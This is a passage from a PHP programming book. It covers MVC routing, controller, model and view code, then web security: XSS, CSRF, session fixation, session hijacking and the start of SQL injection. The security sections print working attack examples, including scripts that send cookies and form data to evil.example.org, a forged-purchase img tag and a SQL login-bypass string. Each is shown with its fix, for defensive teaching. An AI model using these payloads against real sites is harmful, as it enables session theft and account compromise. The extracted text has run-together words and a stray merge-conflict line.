$route = $router->getRoute('/user-account/view/123');
This gives usthefollowing output:
array(4) {
  ["page"]=>
  string(12) "user-account"
  ["action"]=>
  string(4) "view"
  ["id"]=>
  string(3) "123"
  ["controller"]=>
  string(7) "default"
}
Withamore complex URL likeFlickr ,wemight want tousearoute such as:
$router->addRoute("/photos/alnum:user/int:photoId/in/regex: ➥
  (?P<groupType>([a-z]+?))-(?P<groupId>([0-9]+?))");
When calling the/photos/dshafik/5584010786/in/set-72157626290864145 Flickr
URL, itwill give us:
array(4) {
  ["user"]=>
  string(7) "dshafik"
  ["photoId"]=>
  string(10) "5584010786"
  ["groupType"]=>
  string(3) "set"
  ["groupId"]=>
  string(17) "72157626290864145"
}
Now thatwehave arouter ,wecanwrite avery simple front controller .Toautomat-
ically include thecorrect models andviews, thecontroller requires ourmodels and
views tofollow aspecific naming convention. Formodels, wehave amodel with
thesame name asourcontroller; forexample:PHP Master: W rite Cutting-edge Code 166
www.it-ebooks.info
chapter_04/Controller .php
class Photos_Controller {
  /**
   * @var RouterAbstract
   */
  protected $router = false;
  /**
   * Run our request
   * 
   * @param string $url 
   */
  public function dispatch($url, $default_data = array())
  {
    try {
      if (!$this->router) {
        throw new Exception("Router not set");
      }
      $route = $this->router->getRoute($url);
      $controller = ucfirst($route['controller']);
      $action = ucfirst($route['action']);
      unset($route['controller']);
      unset($route['action']);
      // Get our model
      $model = $this->getModel($controller);
      $data = $model->{$action}($route);
      $data = $data + $default_data;
      // Get our view
      $view = $this->getView($controller, $action);
      echo $view->render($data);
    } catch (Exception $e) {
      try {
        if ($url != '/error') {
          $data = array('message' => $e->getMessage());
          $this->dispatch("/error", $data);
        } else {
          throw new Exception("Error Route undefined");167 Design P atterns
www.it-ebooks.info
        }
      } catch (Exception $e) {
        echo "<h1>An unknown error occurred.</h1>";
      }
    }
  }
  /**
   * Set the router
   * 
   * @param RouterAbstract $router 
   */
  public function setRouter(RouterAbstract $router)
  {
    $this->router = $router;
  }
  /**
   * Get an instantiated model class
   * 
   * @param string $name
   * @return mixed
   */
  protected function getModel($name)
  {
    $name .= '_Model';
    $this->includeClass($name);
    return new $name;
  }
  /**
   * Get an instantiated view class
   * 
   * @param string $name
   * @param string $action
   * @return mixed
   */
  protected function getView($name, $action)
  {
    $name .= '_' .$action. 'View';
    $this->includeClass($name);PHP Master: W rite Cutting-edge Code 168
www.it-ebooks.info
    return new $name;
  }
  /**
   * Include a class using PEAR naming scheme
   * 
   * @param string $name 
   * @return void
   * @throws Exception
   */
  protected function includeClass($name)
  {
    $file = str_replace('_', DIRECTORY_SEPARATOR, $name) . '.php';
    if (!file_exists($file)) {
      throw new Exception("Class not found!");
    }
    require_once $file;
  }
}
Asarequirement ofourcontroller ,wewant both acontroller andanaction
param, soourURL needs tochange tobealittle more explicit:
/photos/getPhoto/dshafik/5584010786/in/set-72157626290864145
Ifweagain load ourphoto URL, we’ll magically (not really) see:
<h1>Brooke in the Woods</h1>
<img src="http://farm6.static.flickr.com/5142/5584010786_95a4c15
e8a_z.jpg" width="427" height="640">
The Model
Inourcontroller ,weimplemented agetModel() method; let’stake alook atwhat’ s
going onbeneath thecode.
We’ve decided, forourMVC structure, thatwe’ll have onemodel percontroller ,
with amethod foreach action. Inthecase ofourURL, wehave aphotos controller
andagetPhoto() action. So,wewilldefine aPhotos_Model class with agetPhoto()
method:169 Design P atterns
www.it-ebooks.info
chapter_04/Model.php
class Photos_Model {
  public function getPhoto($options)
  {
    // Retrieve the photo's URL, from a DB, by constructing a ➥
         file path, etc
    
    // This is hard-coded
    return array(
        'title' => 'Brooke in the Woods',
        'width' => 427,
        'height' => 640,
        'url' => 'http://farm6.static.flickr.com/5142/ ➥
           5584010786_95a4c15e8a_z.jpg',
    );
  }
}
Every model function must return anarray ofdata. This data isthen used torender
theview .Notevery function retrieves data, however .Let’stake alook atanexample
error model:
chapter_04/ErrorModel.php
class Error_Model {
  public function showError($data)
  {
    $config = Registry::get('site-config');
    $factory = new Log_Factory();
    $log = $factory->getLog($config['log']['type'], $config['log']);
    $log->add($data['message']);
    return array();
  }
}
Inthiscase, themodel simply logs (using ourRegistry andLog_Factory !),and
returns anempty array .PHP Master: W rite Cutting-edge Code 170
www.it-ebooks.info
The View
Ourviews areequally simple: aclass named after both ourcontroller andaction—in
thiscase,Photos_GetPhotoView .Each view class hasasimplerender() method
thattakes thedata anddisplays therelevant page:
chapter_04/V iew.php
class Photos_GetPhotoView {
  public function render($data)
  {
    $html = '<h1>%s</h1>' . PHP_EOL;
    $html .= '<img src="%s" width="%s" height="%s">' . PHP_EOL;
    
    $return = sprintf($html, $data['title'], $data['url'], ➥
      $data['width'], $data['height']);
    
    return $return;
  }
}
Inthiscase, weuseasimplesprintf() calltotemplate ourHTML. Depending on
your application, youcould throw inanytemplate engine, such asTwig,3Smarty ,4
orSavant.5
Byusing basic PHP arrays astheinterchange format between controller andmodel,
andthen model andview ,weareallowing ourmodel—the heart ofourbusiness
logic—to dowhatever isnecessary (including refactoring orrewriting it)without
breaking ourview ,solong asthedata structure contract ishonored.
Inlight ofthis, youcanseethattheMVC pattern isreally about creating standards,
conventions, andcontracts between thedifferent layers ofyour application.
Pattern Formation
Ithasbeen said, when itcomes tocomputer programming, thatnoproblem isanew
problem—someone elsehassolved italready .This isespecially soontheWeb!The
design pattern isthecodification ofthisconcept; crafted over many years viatrial
3http://twig.sensiolabs.org/
4http://www .smarty .net/
5http://phpsavant.com/171 Design P atterns
www.it-ebooks.info
anderror ,design patterns aretheconsensus ofbest practices formany common
problems.
Regardless, don’t assume thatdesign patterns arethebe-all andend-all. There are
many nuances toemploying them: some forced bytechnical limitations based on
theprogramming language being used; others bythespecifics ofthetask athand.
Butthey arebytheir definition conceptual andlanguage-agnostic, andyouwillfind
them ofusenomatter what language youwrite code in—but especially PHP.PHP Master: W rite Cutting-edge Code 172
www.it-ebooks.info
Chapter5
Security
Asmore people useanddepend ontechnology ,more users attempt tomanipulate
it.Alltechnologies have some level ofcapability formisuse inthehands ofthose
with illintentions. This isillustrated well bythehigh-profile security compromises
oftheEpsilon unit ofAlliance Data Systems,1Sony’ sPlayStation Network,2and
Google’ sGmail service.3
Thepurpose ofthischapter istoshow youhow tosecure your PHP applications
from common attack vectors ,orspecific types ofvulnerabilities thatattackers can
exploit. This chapter isnotintended tobeacomprehensive guide tosecurity prin-
ciples orpractices; liketechnology ,these subjects areinaconstant state ofdevelop-
ment andevolution. Instead, thefocus ofthechapter willbeonsecurity issues that
arecommonly seen inreal-world PHP applications, andhow toavoid them.
1http://www .reuters.com/article/2011/04/04/idUSL3E7F42DE20110404
2http://blog.us.playstation.com/2011/04/26/update-on-playstation-network-and-qriocity/
3http://www .reuters.com/article/2011/06/01/us-google-hacking-idUSTRE7506U320110601
www.it-ebooks.info
Be Paranoid
“Now andthen, Iannounce ‘Iknow you’re listening’ toempty rooms.”4
Many attack vectors have acentral cause: trusting tainted data—data introduced
intothesystem bytheuser.Thenormal usecase foranapplication may only involve
aweb browser andauser with arelatively limited knowledge oftheInternet and
how itworks. However ,itonly takes onemalicious user with knowledge thatsur-
passes your own tocompromise sensitive portions ofyour application source code,
orthedata itexposes.
Insome cases, wetrust user data because wedon’t realize it’sprovided bytheuser.
Forexample, youmight notthink thatthevariable$_SERVER['HTTP_HOST'] isuser-
supplied. Thename ofthe$_SERVER superglobal implies thatthedata itcontains
isprovided bytheweb server ,orisspecific totheserver environment.
However ,thevalue ofthe$_SERVER['HTTP_HOST'] variable isprovided bytheHost
header oftheincoming application request, which isprovided bythe
browser—essentially ,theuser.This trait alone makes itdangerous totrust. Users
cancontrol alotmore data than most people think, soyoushould avoid trusting
anyofit.
Inshort, when dealing with matters ofapplication security ,it’sbetter tobeoverly
cautious than notcareful enough. Always assume theworst-case scenario. Asthe
oldsaying goes, “It’sonly paranoia ifthey aren’t outtogetyou.” When itcomes to
exploiting your applications, they are.
Filter Input, Escape Output
Thephrase filter input, escape output —sometimes abbreviated toFIEO—has become
amantra forsecurity inPHP applications. Itrefers toapractice used toavoid situ-
ations where user input canbeinterpreted tohave semantic meaning beyond the
simple data itrepresents.
These types ofsituations areacommon source ofseveral attack vectors. They con-
tributed tothedevelopment ofthemagic quotes PHP configuration settings intro-
4http://xkcd.com/525/PHP Master: W rite Cutting-edge Code 174
www.it-ebooks.info
duced inPHP 2anddeprecated inPHP 5.3.5These settings were atechnical measure
implemented inanattempt tosolve asocial problem: thelack ofeducation about
security vulnerabilities inthegeneral population ofjunior -level PHP developers.
Theissue with thisapproach isthatitmakes anassumption about how data isused,
which canonly bedetermined onacase-by-case basis. Isitbeing stored inadata-
base? Isitbeing included intheoutput sent back totheuser? Each ofthese scenarios
requires data tobemodified inadifferent way before itcanbeused foritsintended
purpose.
FIEO presents theidea thatthesame general approach must beapplied toanapplic-
ation’ sinput andoutput: modifying thatdata soitcannever beinterpreted asany-
thing other than data, andtherefore can’t affect theapplication’ sfunctionality .
Filtering and V alidation
Filtering ,also sometimes called sanitization ,istheprocess ofremoving unwanted
characters from user input, andmodifying ittomake itsuitable foraparticular use.
Validation does notmodify user input; itmerely indicates whether ornotitconforms
toasetofrules, such asthose dictating theformat ofanemail address. Thefilter
extension provides animplementation ofboth ofthese forhandling multiple common
types ofdata. Here areexamples ofperforming both processes onanalleged email
address:
chapter_05/filter .php
$email_sanitized = filter_var($email, FILTER_SANITIZE_EMAIL);
$email_is_valid = filter_var($email, FILTER_VALIDATE_EMAIL);
Forvalidating with some simpler ,more general patterns, thectype extension
provides afewfunctions.6Some ofthese include thefollowing:
5Formore onmagic quotes, visit Wikipedia’ spage onthesubject:
http://en.wikipedia.org/wiki/Magic_quotes
6http://php.net/ctype175 Security
www.it-ebooks.info
chapter_05/ctype.php
$is_alpha = ctype_alpha($input);
$is_integer = ctype_digit($input);
$is_alphanumeric = ctype_alnum($input);
Finally ,formore advanced filtering andvalidation, thePCRE (Perl-Compatible
Regular Expression) extension7isafairly powerful andflexible tool. Itrequires
knowledge ofregular expressions, buttheextension’ smanual section includes
everything youneed toknow togetstarted. Here areexamples tofilter andvalidate
alphanumeric strings:
chapter_05/preg.php
$input_sanitized = preg_replace('/[^A-Za-z0-9]/', '', $input);
$input_is_valid = (bool) preg_match('/^[A-Za-z0-9]$/', $input);
Foranexcellent reference onregular expressions, check outMastering Regular Ex-
pressions byJeffrey E.F.Friedl (Sebastopol: O’Reilly ,2006).8
Other methods offiltering input thatarespecific totheintended usage ofthatinput
will becovered later inthischapter .Escaping output iscovered shortly .
Cross-site Scripting
Forcross-site scripting —commonly abbreviated asXSS—the attack vector targets
anarea where auser-supplied variable isincluded inapplication output, butnot
properly escaped. This allows anattacker toinject aclient-side script oftheir choice
aspart ofthatvariable’ svalue. Here’ sanexample ofcode vulnerable tothistype
ofattack:
<form action=”<?php echo $_SERVER['PHP_SELF']; ?>”>
  <input type=”submit” value=”Submit” />
</form>
7http://php.net/pcre
8http://oreilly .com/catalog/9780596528126PHP Master: W rite Cutting-edge Code 176
www.it-ebooks.info
The Attack
This particular example requires thattheAcceptPathInfo Apache configuration
setting9(ortheequivalent foryour particular web server) isenabled. This iscom-
monly thecase inweb server configurations thatinclude support forlanguages like
PHP.This setting causes theweb server toreturn aparticular page when theclient
requests onethat’sprefixed with thesame path, asopposed tomatching itexactly .
Forexample, let’ssaythatapage exists at/test.php andtheclient makes arequest
for/test.php/foo .IfAcceptPathInfo isenabled, theweb server will resolve there-
quest to/test.php ;ifit’sdisabled, theweb server will conclude thatnopage exists
atthatlocation andreturn a404 Not Found response.
This issignificant because whenAcceptPathInfo isenabled, itallows anattacker
toappend arbitrary data tothepath oftheresource they’re requesting, while not
preventing theweb server from resolving thatpath tothesame PHP script. Inthe
context ofthisexample, let’ssaythatanattacker decides toinject thisclient-side
code:
<script>
new Image().src = 'http://evil.example.org/steal.php?cookies=' +
  encodeURIComponent(document.cookie);
</script>
This code takes advantage ofthefactthatbrowsers allow embedding ofimages
hosted ondifferent domains andenable thecreation ofimage objects inclient-side
scripts. Thecode does thistotransmit cookies forthecurrent user toaremote script
thattheattacker hasputinto place toreceive thedata, most likely tohijack the
user’ ssession—more onthatlater.
Toinject thisclient-side script into thepage, theattacker hastosurround itwith
additional markup toclose theoriginal<form> tag,andthen make that<form> tag’s
closing quote andbracket part ofanother tag.Inmany cases, thiswill cause mal-
formed markup, butthat’sonly aconcern ifitaffects theability ofthebrowser to
process themarkup asintended, which israre. Sotheactual code being injected
would look assuch:
9http://httpd.apache.org/docs/2.0/mod/core.html#acceptpathinfo177 Security
www.it-ebooks.info
“>
<script>
new Image().src = 'http://evil.example.org/steal.php?cookies=' +
  encodeURIComponent(document.cookie);
</script>
<span class=”
Technically speaking, theattacker hastoURL-encode theclient-side script aswell
before appending ittotheURL. This may notalways benecessary ,butitdepends
ontheweb browser andweb server inquestion. After URL-encoding thecode tobe
injected, andappending ittotheoriginal URL, theattacker hastheir final URL:
/test.php/%5C%22%3E%3Cscript%3Enew+Image%28%29. ➥
src%3D%5C%27http%3A%2F%2Fevil.example.org%2 ➥
Fsteal.php%3Fcookies%3D%5C%27%2BencodeURIComponent ➥
%28document.cookie%29%3B%3C%2Fscript%3E%3Cspan+class%3D%5C%22 
This URL would result inthefollowing HTML output using theoriginal PHP form
code:
<form action=”/test.php“>
<script>
new Image().src = 'http://evil.example.org/steal.php?cookies=' +
  encodeURIComponent(document.cookie);
</script>
<span class=””>
  <input type=”submit” value=”Submit” />
</form>
Atthispoint, alltheattacker hastodoisshare theURL with users andconvince
them toclick it.Assuming oneofthose users hasasession onthatwebsite, theat-
tacker canthen hijack it.
The Fix
Compared totheattack itself, thefixissurprisingly simple: escape output from PHP
code toprevent theattacker from being able toinject their code inthefirst place.
This looks likethefollowing:PHP Master: W rite Cutting-edge Code 178
www.it-ebooks.info
<form action=”<?php echo htmlentities($_SERVER['PHP_SELF']); ?>”>
  <input type=”submit” value=”Submit” />
</form>
Withtheaddition ofthehtmlentities() call, theattacker’ sURL now generates
thisoutput:
<form action=”/test.php&lt;script&gt;new 
Image().src=\http://evil.example.org/steal.php?cookies=\ ➥
  +encodeURIComponent(document.cookie);&lt;/script&gt;”>
  <input type=”submit” value=”Submit” />
</form>
This could prevent theform submission from working asintended, butitdoes
prevent anattacker from compromising theform. Thefollowing code shows examples
thatmay work asacceptable substitutes for$_SERVER['PHP_SELF'] ;these will
prevent such attacks from breaking theform’ sfunctionality ifAcceptPathInfo
cannot bedisabled:
chapter_05/php_self.php
$_SERVER['SCRIPT_NAME']
str_replace($_SERVER['DOCUMENT_ROOT'], '', $_SERVER ➥
  ['SCRIPT_FILENAME'])
Online Resour ces
There aremany resources available ifyou’re interested inresearching cross-site
scripting abitfurther .Chris Shiflett’ ssiteisahaven ofinformation, andha.ckers.org
provides access toahandy cheat sheet ontheinsandouts offilter evasion. Or,head
tooneofthefollowing sites:
■http://ha.ckers.org/xss.html
■http://shiflett.org/articles/cross-site-scripting
■http://shiflett.org/articles/foiling-cross-site-attacks
■http://shiflett.org/blog/2007/mar/allowing-html-and-preventing-xss
■http://seancoates.com/blogs/xss-woes
■http://phpsec.org/projects/guide/2.html#2.3
■https://www .owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%2179 Security
www.it-ebooks.info
Cross-site Request For gery
Let’ssaythatanattacker wants anexpensive product from apopular online storefront
without paying forit.Instead, they want toplace thedebt onanunsuspecting victim.
Their weapon ofchoice: aCross-site Request Forgery ,often abbreviated toCSRF .
Thepurpose ofthistype ofattack istohave avictim send anHTTP request toa
specific website, taking advantage ofthevictim’ sestablished identity with that
website.
This type ofattack isn’t limited toonline shopping asused inthissection; itcan
beapplied toanysituation thatinvolves thecreation ormodification ofsensitive
data.
The Attack
Let’ssaythatthevictim hasanaccount with thestore website receiving theattacker’ s
request, andhasalready logged into thatwebsite. We’llassume thattheir account
information includes adefault billing address, shipping address, andstored payment
method. Thestore might keep thisinformation toallow auser toconveniently
submit anorder with asingle click.
This feature involves twocomponents. ThefirstisanHTML form thatappears next
toaproduct onapage, andisasfollows:
<form action=”http://example.com/oneclickpurchase.php”>
  <input type=”hidden” name=”product_id” value=”12345” />
  <input type=”submit” value=”1-Click Purchase” />
</form>
Note thatthisform doesn’t specify amethod, meaning thattheweb browser will
default tousingGETwhen theform issubmitted. This willbesignificant later when
theattack isexecuted.
Thesecond component oftheone-click purchase feature isaPHP script used to
process submissions from theHTML form, which might look asfollows:
<?php
// ⋮PHP Master: W rite Cutting-edge Code 180
www.it-ebooks.info
session_start();
$order_id = create_order($_SESSION['user_id']);
add_product_to_order($order_id, $_GET['product_id'], 1);
complete_order($order_id);
$_SESSION['user_id'] hasalready been established bythevictim being logged in.
$_GET['product_id'] comes from theform submission. $_REQUEST could alsohave
been used inplace of$_GET here, as$_REQUEST combines data from$_GET ,$_POST ,
and$_COOKIE .10
Cookies arespecific toadomain. Once awebsite setsacookie, theweb browser
will include itinallsubsequent requests tothatwebsite until either thecookie ex-
pires, ortheweb browser session ends (that is,theweb browser isclosed). This
includes requests made byother websites forassets hosted onthatparticular web-
site—another critical component oftheattack, because itallows theattacker totake
advantage ofthevictim being logged intothattargeted website.
Tocommit theforgery ,theattacker shares aURL inthesame way they might ifex-
ecuting anXSS attack. This URL could easily reference apage with anXSS vulner -
ability thattheattacker hasexploited tomake itmore difficult totrace itback to
them. This URL’spurpose istomake theattacker’ sdesired request when thevictim
visits thatURL. Tomake arequest equivalent tosubmitting theform shown earlier ,
theattacker would merely need thepage todisplay thismarkup:
<img src=”http://example.com/oneclickpurchase.php? ➥
  product_id=12345” />
This image will, ofcourse, appear broken because thePHP script used toprocess
theform submission doesn’t return image data. Even ifthevictim realizes this,
however ,therequest hasalready been made andthedamage isdone. This markup
causes thebrowser toautomatically make anHTTP request likethisoneonthe
victim’ sbehalf, inorder todownload andrender therequested “image”:
GET /oneclickpurchase.php
Host: example.com
Cookie: PHPSESSID=82551688a6333d57647b3ae8807de118
10http://php.net/manual/en/reserved.variables.request.php181 Security
www.it-ebooks.info
Thecookie shown here wassetwhen thevictim logged in,anditistiedtothat
session onthiswebsite. Once they’ve logged in,thesession data contains their user
identifier .Atthispoint, the“image” request may aswell beaform submission made
bythevictim.
Youmight askhow shipping aproduct tothevictim’ sdefault address isuseful if
thataddress isinaccessible totheattacker .Well,ifawebsite makes falsifying a
product order onanaccount thissimple, it’squite likely thatthesame istrue in
changing thedefault shipping address onanaccount. Theattacker could usethe
same technique tochange thevictim’ sshipping address before executing theattack,
fulfilling their goal ofobtaining aproduct attheexpense ofanother .
The Fix
TheuseoftheGETmethod bytheform inthisexample violates section 9.1.1 ofRFC
2616,11thespecification fortheHTTP protocol, which states thefollowing: “...the
convention hasbeen established thattheGETandHEAD methods SHOULD NOT
have thesignificance oftaking anaction other than retrieval. These methods ought
tobeconsidered safe.”Inother words, itshould beimpossible touseGETonare-
source andcause data creation, modification, ordeletion.
There areafewways toaddress thisvulnerability ,buttheprimary oneistohave
theform usePOST instead ofGET.GETrequests canbemade forscripts, stylesheets,
andimages, allonadomain other than theoneserving thecurrent page. They also
aren’t obligated toreturn thetype ofresource they purport tobe.Execution ofPOST
requests byweb browsers, ontheother hand, islimited toform submissions and
asynchronous requests, thelatter ofwhich isrestricted bythesame origin policy .
(You’ll remember these were discussed inthesection called “Ajax andWebServices”
inChapter 3.)
Themodified form will look likethis:
<form method=”post” action=”http://example.com/oneclickpurchase. ➥
    php”>
  <input type=”hidden” name=”product_id” value=”12345” />
  <input type=”submit” value=”1-Click Purchase” />
</form>
11http://www .w3.org/Protocols/rfc2616/rfc2616-sec9.html#sec9.1.1PHP Master: W rite Cutting-edge Code 182
www.it-ebooks.info
This change doesn’t preclude thepossibility thatanattacker might duplicate this
HTML onanother website. When avictim submits theform, therequest willinclude
their session cookie forthedomain intheform action.
Toaddress this, youcantake advantage thatanormal user willview theform before
submitting itbyincluding afield with arandom value, known asanonce orCSRF
token .Thetoken willalsobestored intheuser’ ssession, andcompared totheform
value when theform issubmitted toconfirm thatthevalues areidentical. The
modified script tooutput theform looks asfollows:
chapter_05/csr f.php
<?php
session_start();
if ($_POST && $_POST['token'] == $_SESSION['token']) {
  // process form submission
} else {
  $token = uniqid(rand(), true);
  $_SESSION['token'] = $token;
?>
<form method=”post” action=”http://example.com/ ➥
    oneclickpurchase.php”>
  <input type=”hidden” name=”token” value=”<?php echo $token; ?>” />
  <input type=”hidden” name=”product_id” value=”12345” />
  <input type=”submit” value=”1-Click Purchase” />
</form>
<?php
}
One lastmethod iseffective, buthasalarger impact ontheuser experience. When
asensitive action likemaking apurchase isabout tocause achange indata, display
apage explaining theaction about tobetaken, andprompt theuser tore-authenticate
with their credentials. This prevents theattacker from automatically carrying out
actions onthevictim’ sbehalf.
Online Resour ces
There isplenty ofonline material toenlighten youonCSRF ,and, again, Chris
Shiflett’ ssitehassome detailed articles. Aquick Google search should bring up
more than enough information foryou, butit’sdefinitely worth visiting these links:
■http://shiflett.org/articles/cross-site-request-forgeries183 Security
www.it-ebooks.info
■http://shiflett.org/articles/foiling-cross-site-attacks
■http://phpsec.org/projects/guide/2.html#2.4http://phpsec.org/projects/guide/2.html#2.4
■https://www .owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29
Session Fixation
Asjustdemonstrated, theuser session isafrequent target ofattack vectors. This
unique point ofidentification between apotential victim andatarget website has
thepotential tofacilitate several types ofattacks. There arethree methods thatan
attacker canusetoobtain avalid session identifier .Inorder ofdifficulty ,they are:
1.Fixation
2.Capture
3.Prediction
Fixation involves forcing agiven website touseasession identifier provided by
theattacker .Capture isdiscussed further inalater section. Prediction requires that
thesession identifier bepredictable enough sothatitcanbegenerated byanattacker;
fortunately ,PHP’ sdefault method forgenerating session identifiers provides enough
randomness tomake prediction fairly difficult.
The Attack
Executing asession fixation attack isassimple ashaving auser click alinkorsubmit
aform thatincludes asession identifier .Links canbeobfuscated tosome extent
using HTML meta tagsorPHP scripts thatinclude anHTTPLocation header in
their output toredirect thevictim tothefinal destination. Here’ sanexample of
such alink:
<a href=”http://example.com/login.php?PHPSESSID=12345”>Click here ➥
  </a>
Thereferenced resource could display aform used forauthenticating thevictim’ s
identity .Atthatpoint, thatidentity would betiedtothesession andanyrequests
made using it.Theattacker could view adifferent page onthesame siteusing that
session identifier ,andhave access toanydata associated with thevictim’ saccount.PHP Master: W rite Cutting-edge Code 184
www.it-ebooks.info
The Fix
Thesolutions topreventing thisattack depend oninformed usage ofPHP’ suser
session functionality ,including itsruntime configuration.
First, check thestate ofthefollowing configuration settings inyour php.ini file:
session.use_cookies This causes thesession identifier tobepersisted
between requests using cookies. Itshould either
notbesetatall,orexplicitly setto1,itsdefault
value.
session.use_only_cookies This prevents thesession identifier from being
persisted oroverridden byother methods ofintro-
ducing data intotherequest, such asquery string
andPOST parameters. Itshould beexplicitly set
to1.
session.use_trans_sid This causes PHP toautomatically modify itsout-
puttopersist thesession identifier inlinks and
forms. Itshould beexplicitly setto0.
url_rewriter.tags Whensession.use_trans_id isenabled, itdic-
tates what HTML tagshave their values rewritten
toinclude thesession identifier .Itshould beex-
plicitly settotheempty string topreventses-
sion.use_trans_id from having aneffect ifacci-
dentally enabled.
session.name Insituations where thesession identifier canbe
persisted inquery string andform parameters, the
parameter name most often used byattackers is
“PHPSESSID”—the default value ofthissetting.
Changing thistobemore obscure canmake it
slightly more difficult toexecute session fixation
attacks, particularly incases where applications
don’t grant sessions tounauthenticated users, or
where attackers areusing automated tools that
assume thissetting hasitsdefault value.185 Security
www.it-ebooks.info
Any sensitive actions, such asauthenticating auser,should beaccompanied bya
calltothesession_regenerate_id() function. This will change thesession iden-
tifier while maintaining association with theexisting data inthesession. Thus, if
avictim logs inandthisfunction iscalled immediately before redirecting theuser,
their session identifier will differ totheonethattheattacker isattempting tohave
them use.
Online Resour ces
Tightening session security isalways agood technique foraprogrammer tocontinu-
allyimprove upon, andthere areonline resources atyour disposal. TheOpen Web
Application Security Project hasahelpful page onsession fixation attacks, among
other websites:
■http://shiflett.org/articles/session-fixation
■http://phpsec.org/projects/guide/4.html#4.1
>>>>>>> .merge-right.r8880
■http://phpsec.org/projects/guide/4.html#4.1
■https://www .owasp.org/index.php/Session_fixation
Session Hijacking
Thephrase session hijacking canbeabitconfusing, because it’sused todescribe
twothings:
■anytype ofattack thatresults inanattacker gaining access toasession associated
with avictim’ saccount onawebsite, regardless ofhow thataccess isobtained
■thespecific type ofattack thatinvolves capturing anestablished session identi-
fier,asopposed toobtaining asession identifier through fixation orprediction
This section will focus onthelatter meaning.
There arenumerous methods ofcapturing asession identifier .They aregenerally
classified bywhatever medium isused topersist thesession identifier between re-
quests, ascapturing alldata persisted bythatmedium usually becomes thegoal of
theattack.PHP Master: W rite Cutting-edge Code 186
www.it-ebooks.info
The Attack
Theconfiguration measures used toprevent session fixation attacks canalso con-
tribute topreventing session hijacking attacks, because they limit how session
identifiers arepersisted. Toillustrate this, let’slook atanexample ofmarkup that
could hypothetically beinjected byanattacker viaanXSS vulnerability:
<script type=”text/javascript”>
var links = document.getElementsByTagName(“a”);
var query = [];
var i;
for (i = 0; i < links.length; i++) {
  query.push(links[i].getAttribute(“href”);
}
var input = document.getElementsByTagName(“input”);
var form = [];
for (i = 0; i < input.length; i++) {
  if (input[i].getAttribute(“type”) == “hidden”) {
    form.push(input[i].getAttribute(“name”)+“=”+input[i]. ➥
      getAttribute(“value”));
  }
}
new Image().src = 'http://evil.example.org/steal.php?query=' +
  encodeURIComponent(query.join(“|”)) + “&form=” +
  encodeURIComponent(form.join(“|”)) + “&cookie=” + 
  encodeURIComponent(document.cookie);
</script>
This code builds ontheearlier example from thesection called “Cross-site Scripting”
byalso capturing link URLs andname-value pairs forhidden form fields—likely
sources forasession identifier ifyour PHP configuration allows ittobepersisted
inthose areas.
The Fix
Preventing attacks thattarget cookies isregrettably notassimple aschanging afew
configuration settings. There arenocure-all methods, butthere areways tomake
such attacks more difficult.
One simple method istoenable thesession.cookie_httponly PHP setting. Regret-
tably ,thissetting issupported byalimited number ofbrowsers, butforthose that
dosupport it,itprevents cookie data from being accessible toclient-side scripts.187 Security
www.it-ebooks.info
Thealternative tackles theproblem from adifferent angle: itassumes thatthesession
identifier willbecaptured. Thefocus isoninvalidating thatsession based onother
criteria about therequest towhich theattacker may nothave access.
Thefirstcriterion thatmany developers think ofistheuser’ spublic-facing IPaddress.
However ,thisapproach isriddled with problems: multiple users using thesame
connection andthus thesame IPaddress, useofproxy servers obscuring user IP
addresses, internet service providers dynamically allocating IPaddresses thathave
thepotential tochange between requests, attackers spoofing orfalsifying IPaddresses,
andsoon.Inshort, it’snotagood measure torelyupon.
What must beused instead arerequest headers whose values don’t vary between
requests forthesame user.These headers areoptional, sothey canonly beused for
thispurpose when they’re present. They’re reliable because ifaparticular browser
sends them forarequest, chances aregood itwill also include andmaintain the
same values forthem insubsequent requests. Table 5.1shows headers thatgenerally
maintain aconsistent value across requests andthePHP variables thathold them.
Table 5.1. Headers whose values don’t vary between r equests
PHP V ariable Header Name
$_SERVER['HTTP_ACCEPT_CHARSET'] Accept-Charset
$_SERVER['HTTP_ACCEPT_ENCODING'] Accept-Encoding
$_SERVER['HTTP_ACCEPT_LANGUAGE'] Accept-Language
$_SERVER['HTTP_USER_AGENT'] User-Agent
Code topersist andcheck against oneofthese values looks asfollows:
chapter_05/session_hijacking.php
// Session hasn't been started yet, persist the header values
if (!isset($_COOKIE[session_name()])) {
  session_start();
  $_SESSION['HTTP_USER_AGENT'] = $_SERVER['HTTP_USER_AGENT'];
// Session has started, check the persisted values against the ➥
     current request
} else {
  session_start();
  if ($_SESSION['HTTP_USER_AGENT'] != $_SERVER['HTTP_USER_AGENT']) {PHP Master: W rite Cutting-edge Code 188
www.it-ebooks.info
    // Force the user to re-authenticate
  }
}
Online Resour ces
Again, Chris Shiflett’ ssiteandtheOpen WebApplication Security Project provide
anexcellent background inhow totackle session hijacking. Further reading canbe
found here:
■http://shiflett.org/articles/session-hijacking
■http://shiflett.org/articles/the-truth-about-sessions
■http://phpsec.org/projects/guide/4.html#4.2
■https://www .owasp.org/index.php/Session_hijacking_attack
SQL Injection
Thenature ofthistype ofvulnerability relates back tothesection called “Filter Input,
Escape Output” .Inprinciple, SQL injection isvery similar toXSS inthattheobject
oftheattack istomake theapplication interpret user input ashaving meaning
beyond thedata itrepresents. WithXSS, theintent istohave thatinput executed
asclient-side code; with SQL injection, thegoal isforinput tobeinterpreted asan
SQL query orpart ofone.
The Attack
Let’ssaythatanattacker wants tofind outwhere avictim lives. This information
isassociated with thevictim’ saccount onaparticular website, butviewing access
isrestricted tousers ofthevictim’ schoosing which, naturally ,excludes theattacker .
Theattacker knows theusername ofthevictim, however ,andtries togain access
tothevictim’ saccount fortheir street address. Source code tologauser into this
website could beasfollows:
if ($_POST) {
  $pdo = new PDO('...');
  $query = 'SELECT user_id FROM users WHERE username = “' . ➥
    $_POST['username'] . '” AND password = “' . $_POST ➥
    ['password'] . '”';
  $result = $pdo->query($query);189 Security
www.it-ebooks.info
  if ($user_id = $result->fetchColumn()) {
    session_start();
    $_SESSION['user_id'] = $user_id;
    // User is logged in, redirect to a different page
  } else {
    // Invalid login credentials, display an error
  }
}
Theissue with thiscode isthattheform input isunfiltered. Assuch, anything that
theattacker enters becomes part ofthequery ,whether it’saliteral string value or
aquery clause. Theattacker inthiscase istrying towork around therequirement
tosupply acorrect value forthepassword. Consider thisvalue being entered inthe
username field ofthelogin form:
victim_username” --
Theresulting query constructed bythelogin code isthis:
SELECT user_id FROM users WHERE username = “victim_username” --” ➥
  AND password = “...”
The--injected here istheSQL-92 operator todenote thestart ofacomment. As
such, everything uptothefirst newline or(inthiscase) theendofthequery isig-
